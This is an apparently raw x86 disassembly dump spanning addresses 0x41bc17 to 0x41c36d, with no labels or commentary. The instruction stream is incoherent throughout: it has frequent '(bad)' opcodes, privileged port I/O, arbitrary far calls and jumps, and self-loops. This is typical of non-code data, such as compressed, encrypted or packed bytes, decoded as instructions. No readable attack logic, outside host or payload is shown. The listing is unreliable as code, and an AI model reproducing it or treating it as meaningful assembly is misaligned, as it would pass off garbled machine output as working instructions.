  41bc17:	sbb    cl,BYTE PTR [esi+0x5bcb8136]
  41bc1d:	jnp    0x41bc77
  41bc1f:	sub    edi,DWORD PTR [ebp+esi*4+0x7f]
  41bc23:	mov    WORD PTR [ecx-0x75d15862],gs
  41bc29:	test   dh,bl
  41bc2b:	mov    ebx,0xb10cde01
  41bc30:	es cmc 
  41bc32:	mov    edi,0xe310413
  41bc37:	das    
  41bc38:	push   ss
  41bc39:	shl    DWORD PTR [ebx+0x70],0x39
  41bc3d:	add    cl,BYTE PTR [eax]
  41bc3f:	pusha  
  41bc40:	or     al,0xd6
  41bc42:	cwde   
  41bc43:	push   ds
  41bc44:	or     esp,DWORD PTR [edi]
  41bc46:	les    edx,FWORD PTR [esi]
  41bc48:	outs   dx,DWORD PTR ds:[esi]
  41bc49:	sub    al,0xaa
  41bc4b:	popa   
  41bc4c:	icebp  
  41bc4d:	adc    eax,0x34691886
  41bc52:	adc    dh,BYTE PTR [eax*4-0x1c933950]
  41bc59:	fst    QWORD PTR [eax-0x6cf698db]
  41bc5f:	sub    DWORD PTR [edi-0x62534a11],ecx
  41bc65:	pop    esp
  41bc66:	(bad)  
  41bc69:	inc    eax
  41bc6a:	add    dh,ah
  41bc6c:	scas   al,BYTE PTR es:[edi]
  41bc6d:	sub    DWORD PTR [eax+0x12],0xffffffc5
  41bc71:	(bad)  
  41bc72:	data16 stc 
  41bc74:	sub    eax,0x63130635
  41bc79:	stos   BYTE PTR es:[edi],al
  41bc7a:	jns    0x41bce3
  41bc7c:	mov    ds:0xeb77d8d0,eax
  41bc81:	imul   ebx,DWORD PTR [edi-0x5fcd187e],0xee88e726
  41bc8b:	scas   eax,DWORD PTR es:[edi]
  41bc8c:	(bad)  
  41bc8d:	sbb    eax,0x1de7f8c9
  41bc92:	xor    al,0x9a
  41bc94:	sbb    BYTE PTR [edx+ebx*4-0x2c],bh
  41bc98:	xchg   esi,eax
  41bc99:	aam    0x8
  41bc9b:	inc    esi
  41bc9c:	jecxz  0x41bc60
  41bc9e:	stc    
  41bc9f:	hlt    
  41bca0:	mov    es,WORD PTR [esi+0x72]
  41bca3:	in     eax,0x41
  41bca5:	dec    esp
  41bca6:	out    dx,al
  41bca7:	dec    BYTE PTR [ebp+0x1c903629]
  41bcad:	dec    DWORD PTR [ebx+0x6e]
  41bcb0:	pop    esi
  41bcb1:	push   edx
  41bcb2:	add    DWORD PTR [ebx-0x6e],esp
  41bcb5:	dec    edx
  41bcb6:	push   ebx
  41bcb7:	bound  edx,QWORD PTR [edx]
  41bcb9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bcba:	sub    BYTE PTR [eax+edx*1-0x4a],al
  41bcbe:	ja     0x41bcda
  41bcc0:	lods   al,BYTE PTR ds:[esi]
  41bcc1:	adc    eax,DWORD PTR [edx+0x1b]
  41bcc4:	mov    eax,ds:0x880c4213
  41bcc9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bcca:	or     BYTE PTR [eax+0x3486820d],ah
  41bcd0:	scas   al,BYTE PTR es:[edi]
  41bcd1:	mov    esp,0x6b8d818c
  41bcd6:	fild   DWORD PTR [eax+edx*8-0x79ea0b8e]
  41bcdd:	sub    eax,0x276b18f3
  41bce2:	jp     0x41bcc5
  41bce4:	retf   0x0
  41bce7:	and    BYTE PTR [eax],al
  41bce9:	dec    ecx
  41bcea:	inc    esp
  41bceb:	inc    ecx
  41bcec:	push   esp
  41bced:	(bad)  
  41bcee:	push   ecx
  41bcef:	or     dh,BYTE PTR [edx+ebx*8]
  41bcf2:	adc    DWORD PTR [eax+edx*8],esp
  41bcf5:	add    al,0xc0
  41bcf7:	sub    BYTE PTR ds:0x18b64692,dl
  41bcfd:	inc    edi
  41bcfe:	gs sub dl,al
  41bd01:	xchg   esi,eax
  41bd02:	popf   
  41bd03:	outs   dx,BYTE PTR ds:[esi]
  41bd04:	(bad)  
  41bd05:	pop    eax
  41bd06:	push   es
  41bd07:	in     al,dx
  41bd08:	scas   al,BYTE PTR es:[edi]
  41bd09:	pop    ds
  41bd0a:	in     eax,0xa1
  41bd0c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bd0d:	or     dl,BYTE PTR [esi-0x491ba1b2]
  41bd13:	arpl   WORD PTR [esi+0x75fd2cd7],cx
  41bd19:	push   ds
  41bd1a:	fwait
  41bd1b:	jl     0x41bca5
  41bd1d:	sbb    eax,0x97960c0a
  41bd22:	mov    eax,0x799dae35
  41bd27:	(bad)  
  41bd28:	int3   
  41bd29:	lahf   
  41bd2a:	sbb    bh,BYTE PTR [esi-0x3204a07]
  41bd30:	jmp    0x41bd29
  41bd32:	lahf   
  41bd33:	clc    
  41bd34:	popf   
  41bd35:	out    dx,eax
  41bd36:	cli    
  41bd37:	jmp    FWORD PTR [esi]
  41bd39:	pop    esp
  41bd3a:	mov    eax,0x4e765f0
  41bd3f:	(bad)  
  41bd40:	stos   BYTE PTR es:[edi],al
  41bd41:	push   edx
  41bd42:	add    BYTE PTR [ebx+0xb3d3124],0xa6
  41bd49:	sub    eax,0x3685dc36
  41bd4e:	or     al,0x3f
  41bd50:	clc    
  41bd51:	pop    ebx
  41bd52:	lahf   
  41bd53:	clc    
  41bd54:	xchg   esi,eax
  41bd55:	scas   al,BYTE PTR es:[edi]
  41bd56:	in     eax,0x1b
  41bd58:	mov    ecx,DWORD PTR [edx+0x56]
  41bd5b:	popf   
  41bd5c:	adc    ebx,DWORD PTR [edx-0x4c966943]
  41bd62:	leave  
  41bd63:	aad    0x95
  41bd65:	movhlps xmm0,xmm7
  41bd68:	xor    esp,DWORD PTR [ebp+esi*2-0x76]
  41bd6c:	mov    bh,0x2e
  41bd6e:	jno    0x41bd27
  41bd70:	lds    esp,FWORD PTR [eax+0xb]
  41bd73:	(bad)  
  41bd74:	jae    0x41bdb8
  41bd76:	push   ebp
  41bd77:	xchg   esp,eax
  41bd78:	or     al,0x4a
  41bd7a:	xchg   edi,eax
  41bd7b:	les    edx,FWORD PTR cs:[esi]
  41bd7e:	mov    ah,0x3
  41bd80:	dec    ebx
  41bd81:	pop    esp
  41bd82:	nop
  41bd83:	pop    esp
  41bd84:	rcl    BYTE PTR [ebx+ebp*8-0x5914b286],1
  41bd8b:	ror    DWORD PTR [esi+edx*2+0x4e9a2ca7],cl
  41bd92:	xchg   ebx,eax
  41bd93:	jbe    0x41bd51
  41bd95:	sbb    BYTE PTR [ebx-0x5a73be56],al
  41bd9b:	mov    al,0x6
  41bd9d:	jmp    0x41bda3
  41bd9f:	imul   ebx,DWORD PTR [eax*4+0x97f849],0x5d
  41bda7:	sub    BYTE PTR [eax],ch
  41bda9:	inc    esp
  41bdaa:	call   0x54c62dd3
  41bdaf:	push   ds
  41bdb0:	ins    BYTE PTR es:[edi],dx
  41bdb1:	mov    al,0xcc
  41bdb3:	dec    esp
  41bdb4:	inc    eax
  41bdb5:	mov    ebx,0xcbb92c73
  41bdba:	jl     0x41bda3
  41bdbc:	loopne 0x41bdee
  41bdbe:	pop    ss
  41bdbf:	mov    ds:0x99b75972,al
  41bdc4:	fiadd  DWORD PTR [edi]
  41bdc6:	sbb    ebx,edi
  41bdc8:	mov    dh,BYTE PTR [ecx-0x77998f55]
  41bdce:	xchg   ecx,eax
  41bdcf:	xor    DWORD PTR [edx-0x1adebbdb],ecx
  41bdd5:	repnz xchg esi,eax
  41bdd7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bdd8:	mov    esi,0xd98c4693
  41bddd:	jl     0x41bdbe
  41bddf:	loopne 0x41bd92
  41bde1:	(bad)  
  41bde2:	mov    ds:0xd5267e92,al
  41bde7:	push   cs
  41bde8:	adc    DWORD PTR [edi-0x53e75d30],ecx
  41bdee:	pop    eax
  41bdef:	mov    edx,0xa434e818
  41bdf4:	push   0xffffff87
  41bdf6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bdf7:	and    ebp,DWORD PTR es:[edi+0x66]
  41bdfb:	mov    ah,0xba
  41bdfd:	rcl    edi,0x2f
  41be00:	or     eax,0x37f80c30
  41be05:	ins    DWORD PTR es:[edi],dx
  41be06:	stos   BYTE PTR es:[edi],al
  41be07:	dec    esi
  41be08:	fcomp  DWORD PTR [ecx+edx*8]
  41be0b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41be0c:	hlt    
  41be0d:	pop    edx
  41be0e:	mov    BYTE PTR [esi-0x7dff723c],dl
  41be14:	or     DWORD PTR [eax+0x4a],0xefaa6215
  41be1b:	popa   
  41be1c:	push   ebp
  41be1d:	push   0x34443485
  41be22:	sbb    BYTE PTR [edx+0x8],0x2
  41be26:	or     BYTE PTR ss:[ecx+0x21],ah
  41be2a:	or     BYTE PTR [eax],al
  41be2c:	fs inc ebp
  41be2e:	pop    edi
  41be2f:	(bad)  
  41be31:	push   esp
  41be32:	out    0x5d,eax
  41be34:	mov    edx,0xdec17d0d
  41be39:	sub    cl,0x90
  41be3c:	fdiv   DWORD PTR [ebx+0xe]
  41be3f:	je     0x41beb2
  41be41:	push   ds
  41be42:	sub    bl,cl
  41be44:	fdivr  st,st(3)
  41be46:	test   BYTE PTR [eax+0x4],dl
  41be49:	xor    eax,0x7ec20911
  41be4e:	aad    0xcf
  41be50:	pusha  
  41be51:	dec    eax
  41be52:	dec    esi
  41be53:	or     eax,ecx
  41be55:	inc    esp
  41be56:	xor    DWORD PTR [ecx+ebx*1+0x2d],0xffffffde
  41be5b:	inc    edi
  41be5c:	call   0xa7f4:0x5ebd825
  41be63:	pop    ss
  41be64:	fiadd  DWORD PTR [eax+0x54]
  41be67:	and    DWORD PTR [esi+0x21],esi
  41be6a:	popa   
  41be6b:	adc    al,BYTE PTR [ebp+0x6a]
  41be6e:	push   ebx
  41be6f:	mov    esi,0x5e1a9bf1
  41be74:	cmc    
  41be75:	adc    eax,0xf2e2f0cf
  41be7a:	jne    0x41beb8
  41be7c:	(bad)  
  41be7d:	jle    0x41be13
  41be7f:	imul   edi,DWORD PTR [eax-0x5de62c7c],0x7409a273
  41be89:	sub    cl,ah
  41be8b:	and    eax,0x85ed1829
  41be90:	sbb    eax,0xa5290c06
  41be95:	loopne 0x41bee1
  41be97:	mov    eax,0x2cf0c5c8
  41be9c:	scas   eax,DWORD PTR es:[edi]
  41be9d:	sub    DWORD PTR [edi+0x787df79b],edi
  41bea3:	(bad)  
  41bea4:	cmc    
  41bea5:	imul   ebp,DWORD PTR [edi],0x66
  41bea8:	std    
  41bea9:	int3   
  41beaa:	cs jnp 0x41beac
  41bead:	frstor [edi-0x4a071a87]
  41beb3:	jl     0x41bf2f
  41beb5:	cli    
  41beb6:	daa    
  41beb7:	test   al,0x9
  41beb9:	pushf  
  41beba:	pop    ecx
  41bebb:	jp     0x41bef2
  41bebd:	out    dx,eax
  41bebe:	in     eax,0x1c
  41bec0:	push   ecx
  41bec1:	data16 jecxz 0x41be81
  41bec4:	pop    ebp
  41bec5:	sti    
  41bec6:	out    dx,eax
  41bec7:	push   ecx
  41bec8:	mov    ebp,0x3f178b8d
  41becd:	aas    
  41bece:	cmp    edx,0x22
  41bed1:	outs   dx,BYTE PTR ds:[esi]
  41bed2:	das    
  41bed3:	js     0x41beea
  41bed5:	loopne 0x41bf50
  41bed7:	xchg   esi,eax
  41bed8:	call   DWORD PTR [esi]
  41beda:	aas    
  41bedb:	in     eax,dx
  41bedc:	pop    ecx
  41bedd:	xor    BYTE PTR [edi-0x40],dl
  41bee0:	in     al,dx
  41bee1:	push   cs
  41bee2:	addr16 in eax,0x7
  41bee5:	call   FWORD PTR [edi+0x7b62bc8f]
  41beeb:	arpl   si,di
  41beed:	cmp    eax,0xd5d3fbc6
  41bef2:	rcl    BYTE PTR [edx],0x9a
  41bef5:	mov    gs,ecx
  41bef7:	fs xchg ebx,eax
  41bef9:	in     eax,dx
  41befa:	loope  0x41bf1f
  41befc:	pop    esp
  41befd:	cmp    dh,dl
  41beff:	cs fs jne 0x41bf45
  41bf03:	xor    DWORD PTR [eax+ebx*8-0x5d7c53e6],esi
  41bf0a:	jo     0x41bf20
  41bf0c:	xchg   ebp,eax
  41bf0d:	arpl   WORD PTR [ebp+0x1e5619ae],si
  41bf13:	out    0xd3,eax
  41bf15:	enter  0x18aa,0x3
  41bf19:	fidiv  DWORD PTR ds:0x2a42e0a0
  41bf1f:	arpl   WORD PTR [ecx],di
  41bf21:	imul   edx,DWORD PTR [edx],0xffffffd2
  41bf24:	imul   ecx,DWORD PTR [edx+eiz*8-0x1a],0x5b
  41bf29:	jo     0x41bf8d
  41bf2b:	xor    DWORD PTR [edx],esp
  41bf2d:	mov    ah,0x41
  41bf2f:	jmp    0xc517a166
  41bf34:	xchg   esp,eax
  41bf35:	xchg   edi,eax
  41bf36:	push   ss
  41bf37:	ss and edi,esp
  41bf3a:	add    esp,DWORD PTR [edi+0x18]
  41bf3d:	jp     0x41bee7
  41bf3f:	pushf  
  41bf40:	(bad)  
  41bf41:	cmp    bl,BYTE PTR [eax-0x3f2c27bb]
  41bf47:	enter  0x388d,0xed
  41bf4b:	push   cs
  41bf4c:	mov    bl,0xe6
  41bf4e:	xlat   BYTE PTR ds:[ebx]
  41bf4f:	lock jbe 0x41bf1e
  41bf52:	adc    al,0x61
  41bf54:	dec    eax
  41bf55:	mov    DWORD PTR [edi],esi
  41bf57:	xchg   ch,cl
  41bf59:	loop   0x41bf9e
  41bf5b:	pop    esp
  41bf5c:	jecxz  0x41bf3b
  41bf5e:	adc    al,0xc5
  41bf60:	mov    ebx,0x1f7c3d38
  41bf65:	inc    edi
  41bf66:	stos   BYTE PTR es:[edi],al
  41bf67:	call   0x612d:0xd2896295
  41bf6e:	sub    BYTE PTR gs:[edx+0x4623a343],0x3
  41bf76:	pop    edx
  41bf77:	popa   
  41bf78:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bf79:	(bad)  
  41bf7a:	loop   0x41bf0f
  41bf7c:	mov    al,0x26
  41bf7e:	add    DWORD PTR [ebp-0x5b399cb5],esp
  41bf84:	bts    DWORD PTR [ebx-0x75],edx
  41bf88:	jno    0x41bff4
  41bf8a:	push   ebp
  41bf8b:	push   ecx
  41bf8c:	and    BYTE PTR [esi],0x42
  41bf8f:	dec    esi
  41bf90:	mov    BYTE PTR [ecx],ch
  41bf92:	retf   0x2489
  41bf95:	sub    BYTE PTR [bp+si-0x78],ch
  41bf99:	pop    edx
  41bf9a:	arpl   WORD PTR [eax+0x49],bx
  41bf9d:	adc    DWORD PTR [eax-0x24],edx
  41bfa0:	mov    ds:0xc1562d0b,al
  41bfa5:	dec    ecx
  41bfa6:	repnz idiv BYTE PTR [esi]
  41bfa9:	xchg   edi,eax
  41bfaa:	out    dx,al
  41bfab:	lods   al,BYTE PTR ds:[esi]
  41bfac:	dec    ecx
  41bfad:	not    DWORD PTR [ebx]
  41bfaf:	push   ecx
  41bfb0:	sub    BYTE PTR [ebp+0x1],dl
  41bfb3:	ins    BYTE PTR es:[edi],dx
  41bfb4:	mov    esi,0xcb821c1a
  41bfb9:	jns    0x41c034
  41bfbb:	and    cl,BYTE PTR [edx-0x67]
  41bfbe:	fcomp  QWORD PTR [edi-0x1b1bd821]
  41bfc4:	xchg   ecx,eax
  41bfc5:	loope  0x41bf90
  41bfc7:	popa   
  41bfc8:	push   0xb1021884
  41bfcd:	jmp    0x3b6419a2
  41bfd2:	cmc    
  41bfd3:	mov    ebp,0x10c87d02
  41bfd8:	lea    ecx,[ebp-0x4e]
  41bfdb:	fidivr WORD PTR ds:0x369fb93d
  41bfe1:	or     al,0x79
  41bfe3:	push   ds
  41bfe4:	sbb    BYTE PTR [ecx+0x5c],0x19
  41bfe8:	sti    
  41bfe9:	push   0xffffffc0
  41bfeb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bfec:	sub    BYTE PTR [ebx+ecx*8],ah
  41bfef:	mov    fs,WORD PTR [ecx-0x6]
  41bff2:	xchg   ebp,eax
  41bff3:	arpl   WORD PTR [edi-0x6280475b],di
  41bff9:	jne    0x41c011
  41bffb:	arpl   WORD PTR [ebx-0x2c],dx
  41bffe:	es jge 0x41bf94
  41c001:	inc    edx
  41c002:	jmp    0xe883:0xf9372220
  41c009:	add    al,BYTE PTR [ebx+0x78]
  41c00c:	hlt    
  41c00d:	xlat   BYTE PTR ds:[ebx]
  41c00e:	sub    eax,0x3aefbdef
  41c013:	into   
  41c014:	out    dx,al
  41c015:	cmp    al,0xcd
  41c017:	inc    eax
  41c018:	pop    esi
  41c019:	lea    edx,[ebx-0x7f12d725]
  41c01f:	adc    eax,0x7ad96237
  41c024:	mov    esp,0x5102180d
  41c029:	cmp    bh,BYTE PTR [edx]
  41c02b:	ins    DWORD PTR es:[edi],dx
  41c02c:	cdq    
  41c02d:	jmp    0x41bfb3
  41c02f:	push   esi
  41c030:	jbe    0x41bfeb
  41c032:	mov    ebp,0xeb3b8bba
  41c037:	xchg   edi,eax
  41c038:	repz js 0x41c038
  41c03b:	pop    es
  41c03c:	jl     0x41c02d
  41c03e:	aaa    
  41c03f:	pop    ebp
  41c040:	inc    edi
  41c041:	pop    esp
  41c042:	mov    bl,0xcc
  41c044:	lahf   
  41c045:	pop    esp
  41c046:	in     eax,0x23
  41c048:	mov    edi,0x2ffb8476
  41c04d:	lahf   
  41c04e:	addr16 aad 0x7f
  41c051:	adc    eax,0x988ab333
  41c056:	xchg   edx,eax
  41c057:	leave  
  41c058:	push   ebx
  41c059:	arpl   WORD PTR [ebx+esi*4+0x2dd6f984],cx
  41c060:	ja     0x41c01e
  41c062:	(bad)  
  41c063:	xchg   edi,eax
  41c064:	fdivp  st(6),st
  41c066:	in     eax,0x58
  41c068:	sbb    bh,BYTE PTR [ecx+eax*8+0x1c]
  41c06c:	rol    BYTE PTR [ecx-0x5b],0x9f
  41c070:	iret   
  41c071:	loop   0x41c077
  41c073:	sahf   
  41c074:	repz fdivr QWORD PTR ds:0xcee733c0
  41c07b:	fld    DWORD PTR [edi]
  41c07d:	fdivrp st(6),st
  41c07f:	xchg   ecx,eax
  41c080:	mov    ds:0xfc9f1f17,eax
  41c085:	inc    ebx
  41c086:	jecxz  0x41c013
  41c088:	xor    esp,DWORD PTR [ebx+0x45d092e5]
  41c08e:	jbe    0x41c0c6
  41c090:	fldcw  WORD PTR ss:[ebx-0x760b0dd1]
  41c097:	jg     0x41c028
  41c099:	push   ds
  41c09a:	fisub  DWORD PTR [ebp-0x3ee43fd8]
  41c0a0:	js     0x41c063
  41c0a2:	mov    es,WORD PTR ds:0xd2cb43f
  41c0a8:	dec    edx
  41c0a9:	mov    al,BYTE PTR [ecx-0x1ba6c439]
  41c0af:	jg     0x41c052
  41c0b1:	or     esi,DWORD PTR [edx+ebp*4+0x1a61b684]
  41c0b8:	sbb    ebx,edx
  41c0ba:	fsub   DWORD PTR [edx+0x45]
  41c0bd:	icebp  
  41c0be:	es int 0xa9
  41c0c1:	jae    0x41c0e9
  41c0c3:	aad    0xba
  41c0c5:	lods   eax,DWORD PTR ds:[esi]
  41c0c6:	or     BYTE PTR [ebp-0x4f5bc33e],bl
  41c0cc:	cmp    BYTE PTR [edx+0x7a5d8924],bl
  41c0d2:	mov    eax,ds:0xb2b969f4
  41c0d7:	imul   esp,DWORD PTR [edx],0x4858b926
  41c0dd:	ins    DWORD PTR es:[edi],dx
  41c0de:	psllq  mm2,mm5
  41c0e1:	dec    ebx
  41c0e2:	div    eax
  41c0e4:	stos   BYTE PTR es:[edi],al
  41c0e5:	icebp  
  41c0e6:	mov    bh,0x71
  41c0e8:	jecxz  0x41c0ca
  41c0ea:	lea    ebx,[edi+ebp*1]
  41c0ed:	out    dx,eax
  41c0ee:	loope  0x41c168
  41c0f0:	std    
  41c0f1:	or     eax,0x8bb830dc
  41c0f6:	cdq    
  41c0f7:	mov    ah,0x88
  41c0f9:	js     0x41c0b7
  41c0fb:	sub    eax,0x863daa29
  41c100:	jle    0x41c099
  41c102:	xchg   ecx,eax
  41c103:	jne    0x41c111
  41c105:	std    
  41c106:	nop
  41c107:	retf   0x512d
  41c10a:	ficom  DWORD PTR [ecx]
  41c10c:	(bad)  
  41c10d:	aam    0x88
  41c10f:	cmp    BYTE PTR [esp+ebp*1+0x41],dl
  41c113:	sub    al,0x82
  41c115:	ret    
  41c116:	push   edx
  41c117:	add    al,BYTE PTR [esi-0x24533dd2]
  41c11d:	arpl   WORD PTR [esi],bx
  41c11f:	pop    edx
  41c120:	cmp    bl,BYTE PTR [edx-0x5e]
  41c123:	or     BYTE PTR [eax-0x7b],0xa5
  41c127:	(bad)  
  41c128:	xor    eax,DWORD PTR [edx+0x34]
  41c12b:	push   ecx
  41c12c:	add    BYTE PTR ds:0x7421f793,0xb1
  41c133:	and    ebp,DWORD PTR [edx-0x40]
  41c136:	test   al,0x63
  41c138:	lds    ebx,FWORD PTR [edi]
  41c13a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c13b:	xor    BYTE PTR ds:0x9d836e93,ah
  41c141:	stc    
  41c142:	es xchg edi,eax
  41c144:	mov    bh,0x1d
  41c146:	push   edi
  41c147:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c148:	jo     0x41c17f
  41c14a:	sub    BYTE PTR [esi+0x52],cl
  41c14d:	or     eax,edx
  41c14f:	in     eax,0x4a
  41c151:	sahf   
  41c152:	leave  
  41c153:	adc    DWORD PTR [ebp+0x33e2503b],ecx
  41c159:	mov    ebp,0xb6be9013
  41c15e:	iret   
  41c15f:	mov    ds:0xfa64df7f,al
  41c164:	lock jle 0x41c184
  41c167:	pop    esi
  41c168:	xchg   ebx,eax
  41c169:	xchg   ebx,eax
  41c16a:	dec    edx
  41c16b:	mov    edx,0x5a59c4e0
  41c170:	icebp  
  41c171:	push   ebp
  41c172:	xor    al,0x57
  41c174:	adc    DWORD PTR [edx+0x3ef0a7e1],edx
  41c17a:	stos   DWORD PTR es:[edi],eax
  41c17b:	(bad)  
  41c17c:	fs sbb ebp,edi
  41c17f:	lea    ebx,[edx+edx*2]
  41c182:	and    al,0x72
  41c184:	lock mov ds:0x72ebf250,al
  41c18a:	cmp    eax,0xc85dbfb0
  41c18f:	(bad)  
  41c190:	in     eax,0xea
  41c192:	inc    eax
  41c193:	outs   dx,DWORD PTR ds:[esi]
  41c194:	fmul   QWORD PTR [ecx+0x79]
  41c197:	sub    BYTE PTR [esi],ah
  41c199:	cli    
  41c19a:	jb     0x41c124
  41c19c:	push   0x5c6a888
  41c1a1:	imul   ecx,DWORD PTR [eax+0x17],0x607f45f9
  41c1a8:	loope  0x41c19a
  41c1aa:	mov    DWORD PTR ds:0x5c4687c6,esi
  41c1b0:	cli    
  41c1b1:	and    ch,0x3f
  41c1b4:	call   esp
  41c1b6:	sbb    eax,0x863defbc
  41c1bb:	inc    ecx
  41c1bc:	jl     0x41c1cf
  41c1be:	push   ecx
  41c1bf:	out    dx,eax
  41c1c0:	(bad)  
  41c1c1:	jmp    0x1b90:0xe63b6598
  41c1c8:	xor    BYTE PTR [esi-0x3b49b4fb],dh
  41c1ce:	pop    edx
  41c1cf:	ret    
  41c1d0:	dec    esi
  41c1d1:	cwde   
  41c1d2:	mov    al,0x6a
  41c1d4:	outs   dx,DWORD PTR ds:[esi]
  41c1d5:	lods   ax,WORD PTR ds:[esi]
  41c1d7:	cmp    BYTE PTR [ebx+ebp*1+0x13],cl
  41c1db:	outs   dx,BYTE PTR ds:[esi]
  41c1dc:	sbb    bh,BYTE PTR [esi+0xfaa8781]
  41c1e2:	icebp  
  41c1e3:	jge    0x41c1c4
  41c1e5:	jl     0x41c16b
  41c1e7:	aaa    
  41c1e8:	std    
  41c1e9:	lods   eax,DWORD PTR ds:[esi]
  41c1ea:	adc    esi,DWORD PTR [ecx+esi*2-0x3c]
  41c1ee:	sub    DWORD PTR [edi+0x73],0x5c
  41c1f2:	mov    eax,0xf8e1c5b6
  41c1f7:	or     bh,BYTE PTR [esi]
  41c1f9:	ds mov ebx,0xac9dacc
  41c1ff:	pop    ebx
  41c200:	cmp    al,BYTE PTR [esi+0x7cdd25cb]
  41c206:	idiv   DWORD PTR [ebx]
  41c208:	pop    edi
  41c209:	inc    dh
  41c20b:	mov    bh,0xfe
  41c20d:	rcl    BYTE PTR [edi+0x5f0695b],1
  41c213:	lea    eax,[eax]
  41c215:	sahf   
  41c216:	xchg   esp,ebx
  41c218:	xlat   BYTE PTR ds:[ebx]
  41c219:	jae    0x41c1d1
  41c21b:	mov    bl,0x60
  41c21d:	out    dx,al
  41c21e:	add    esi,DWORD PTR [ebx-0x1f]
  41c221:	inc    ebx
  41c222:	jmp    0x41c222
  41c224:	leave  
  41c225:	xchg   DWORD PTR [esi-0xf410403],ebx
  41c22b:	scas   eax,DWORD PTR es:[edi]
  41c22c:	sub    ch,BYTE PTR [ebx+0x6b]
  41c22f:	inc    edx
  41c230:	xlat   BYTE PTR ds:[ebx]
  41c231:	mov    cl,0x71
  41c233:	xor    DWORD PTR gs:[esi-0x6c761b24],0xffffffbf
  41c23b:	sbb    BYTE PTR [ecx+ebx*4],0xe1
  41c23f:	inc    esi
  41c240:	dec    ecx
  41c241:	add    al,0x52
  41c243:	and    ebx,DWORD PTR [eax+0x14]
  41c246:	pop    edi
  41c247:	push   ss
  41c248:	aam    0x75
  41c24a:	dec    ecx
  41c24b:	loope  0x41c28e
  41c24d:	dec    esp
  41c24e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c24f:	mov    ebp,DWORD PTR [ecx-0x7cc6234f]
  41c255:	jno    0x41c1e5
  41c257:	dec    eax
  41c258:	mov    al,ds:0x61db9ab5
  41c25d:	arpl   WORD PTR [esi-0x54],ax
  41c260:	xchg   ebp,eax
  41c261:	sbb    BYTE PTR [ebx],bh
  41c263:	mov    ds:0xa6ae026,al
  41c268:	int3   
  41c269:	mov    edx,0x9c286a08
  41c26e:	ret    
  41c26f:	sbb    BYTE PTR [ebx-0x17],cl
  41c272:	test   BYTE PTR [ebp+0x20ceb042],dl
  41c278:	cmp    DWORD PTR cs:[esi],eax
  41c27b:	(bad)  
  41c27c:	ret    0x2b4e
  41c27f:	mov    esp,0x7c3df076
  41c284:	cmc    
  41c285:	clc    
  41c286:	fwait
  41c287:	lock popa 
  41c289:	test   DWORD PTR [edi+0x5d],ecx
  41c28c:	jle    0x41c216
  41c28e:	xlat   BYTE PTR ds:[bx]
  41c290:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c291:	pop    esp
  41c292:	fidivr WORD PTR [ecx+edx*4-0x7aa3a331]
  41c299:	jmp    0x43dc6ebb
  41c29e:	cmp    BYTE PTR [ebx],al
  41c2a0:	xchg   ebp,eax
  41c2a1:	sub    ebp,DWORD PTR [ecx+0x35b0a78c]
  41c2a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c2a8:	mov    WORD PTR [eax],gs
  41c2aa:	int    0x8
  41c2ac:	sub    BYTE PTR [eax-0x57895de8],cl
  41c2b2:	call   0xb6d9:0x19222864
  41c2b9:	mov    DWORD PTR [edi],ecx
  41c2bb:	and    BYTE PTR ds:0x874b1a8e,dh
  41c2c1:	sub    BYTE PTR [eax],bh
  41c2c3:	push   es
  41c2c4:	mov    BYTE PTR [esi-0x19ecacee],ah
  41c2ca:	sbb    BYTE PTR [edx+0x4a],cl
  41c2cd:	mov    bl,0xca
  41c2cf:	rcr    BYTE PTR [esi+0x442592a0],1
  41c2d5:	ins    DWORD PTR es:[edi],dx
  41c2d6:	cmp    dh,BYTE PTR [edi+0x19]
  41c2d9:	push   ebx
  41c2da:	(bad)  ds:0x59837126
  41c2e0:	(bad)  [edx+0x63cab5be]
  41c2e6:	out    0x57,eax
  41c2e8:	mov    eax,0x5a69e9bc
  41c2ed:	dec    edi
  41c2ee:	gs add al,0x6b
  41c2f1:	or     eax,0xef9fd496
  41c2f6:	add    al,0x3c
  41c2f8:	sti    
  41c2f9:	and    al,0x1e
  41c2fb:	xchg   edi,eax
  41c2fc:	or     eax,0xcd48b2dc
  41c301:	mov    DWORD PTR [ecx-0x4e],ebx
  41c304:	dec    esp
  41c305:	imul   DWORD PTR ds:0x62b6fa16
  41c30b:	jb     0x41c368
  41c30d:	outs   dx,DWORD PTR ds:[esi]
  41c30e:	dec    eax
  41c30f:	cmp    DWORD PTR [esi+0xc],edi
  41c312:	call   0xfb21:0xec8ce5b3
  41c319:	dec    ecx
  41c31a:	pop    esi
  41c31b:	iret   
  41c31c:	sbb    al,0x84
  41c31e:	or     al,0xda
  41c320:	sbb    eax,0x7ecd0008
  41c325:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c326:	inc    eax
  41c327:	mov    dl,0x51
  41c329:	or     ecx,DWORD PTR [ecx+0x21]
  41c32c:	push   0x8deef57f
  41c331:	cmp    al,0x97
  41c333:	adc    al,0xb5
  41c335:	unpcklps xmm4,XMMWORD PTR [edi+edi*8+0x38]
  41c33a:	fs sub al,0xb8
  41c33d:	daa    
  41c33e:	and    eax,DWORD PTR [ecx+0x7a]
  41c341:	mov    edi,0x385cc749
  41c346:	cs pusha 
  41c348:	addr16 mov ebx,0x58e93e61
  41c34e:	pop    esi
  41c34f:	sbb    esi,DWORD PTR [ecx-0x3d]
  41c352:	int    0xc7
  41c354:	test   al,0x7
  41c356:	adc    eax,0x82cdfe9f
  41c35b:	ja     0x41c319
  41c35d:	lods   eax,DWORD PTR ds:[esi]
  41c35e:	out    0x46,al
  41c360:	jae    0x41c389
  41c362:	out    0x9b,eax
  41c364:	jmp    0x41c33f
  41c366:	or     eax,0x6038a335
  41c36b:	dec    eax
  41c36c:	dec    ebp
  41c36d:	sub    DWORD PTR ds:0xa6425343,esp
